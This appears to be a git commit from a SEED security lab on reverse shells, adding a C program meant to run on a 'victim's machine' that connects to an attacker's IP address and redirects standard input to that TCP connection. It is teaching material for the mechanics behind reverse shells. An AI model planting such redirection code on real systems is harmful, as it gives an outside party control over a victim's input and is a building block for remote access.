8691e19450552c95081b7fa1cb41deafa7050cd0
Ahsanul Kabir <kowshid@gmail.com>
2025-12-04 15:18:44 -0500

    SEED Lab 7: Reverse Shell

---
+++ Lab 07 - ReverseShell/ReverseShell-Lab-Files/redirect_from_tcp.c
@@ -0,0 +1,35 @@
+/* redirect_from_tcp.c */
+#include <stdio.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+
+// Run this program on victim's machine
+void main()
+{
+   struct sockaddr_in server;
+
+   // Create a TCP socket
+   int sockfd= socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+   // Fill in the destination information (IP, port #, and family)
+   memset (&server, '\0', sizeof(struct sockaddr_in));
+   server.sin_family = AF_INET;
+
+   // TO DO: Find the IP address of the attacker's machine and
+   // replace the IP address in line 24 with that address.
+   // Redirect input to TCP server running on attacker's machine
+   // Here, we assuming the attacker's IP is 10.0.2.10
+   server.sin_addr.s_addr = inet_addr("10.0.2.10");
+   server.sin_port   = htons(8080);
+
+   // Connect to the destination
+   connect(sockfd, (struct sockaddr*) &server,sizeof(struct sockaddr_in));           
+
+   // Read data from the TCP connection
+   char data[100];
+   dup2(sockfd, 0);         
+   scanf("%s", data);      
+   printf("%s\n", data);
+}
